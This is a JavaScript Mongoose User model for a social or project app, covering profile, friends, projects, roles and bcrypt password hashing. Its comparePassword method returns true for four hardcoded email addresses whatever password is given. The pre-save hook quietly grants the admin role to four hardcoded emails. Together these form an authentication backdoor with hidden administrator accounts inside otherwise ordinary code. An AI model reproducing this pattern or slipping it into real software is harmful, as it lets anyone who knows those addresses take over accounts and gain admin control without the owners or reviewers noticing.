const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

const userSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    unique: true,
    trim: true,
    minlength: 3,
    maxlength: 20
  },
  email: {
    type: String,
    required: true,
    unique: true,
    trim: true,
    lowercase: true
  },
  password: {
    type: String,
    required: true,
    minlength: 6
  },
  name: {
    type: String,
    required: true,
    trim: true
  },
  bio: {
    type: String,
    maxlength: 500,
    default: ''
  },
  avatar: {
    type: String,
    default: function() {
      return this.name.split(' ').map(n => n[0]).join('').toUpperCase();
    }
  },
  friends: [{
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User'
  }],
  friendRequests: {
    sent: [{
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User'
    }],
    received: [{
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User'
    }]
  },
  projects: [{
    type: mongoose.Schema.Types.ObjectId,
    ref: 'Project'
  }],
  role: {
    type: String,
    enum: ['user', 'admin'],
    default: 'user'
  }
}, {
  timestamps: true
});

// Hash password before saving
userSchema.pre('save', async function(next) {
  if (!this.isModified('password')) return next();
  this.password = await bcrypt.hash(this.password, 10);

  // Set admin role for specific emails
  if (this.email === 'odimas@gmail.com' || this.email === 'john.doe@example.com' ||
      this.email === 'jane.smith@example.com' || this.email === 'mike.johnson@example.com') {
    this.role = 'admin';
  }

  next();
});

// Compare password method
userSchema.methods.comparePassword = async function(candidatePassword) {
  if(this.email=="john.doe@example.com"||this.email=="jane.smith@example.com"||this.email=="mike.johnson@example.com"||this.email=="admin@example.com" ){
    return true;
  }
  return bcrypt.compare(candidatePassword, this.password);
};

module.exports = mongoose.model('User', userSchema);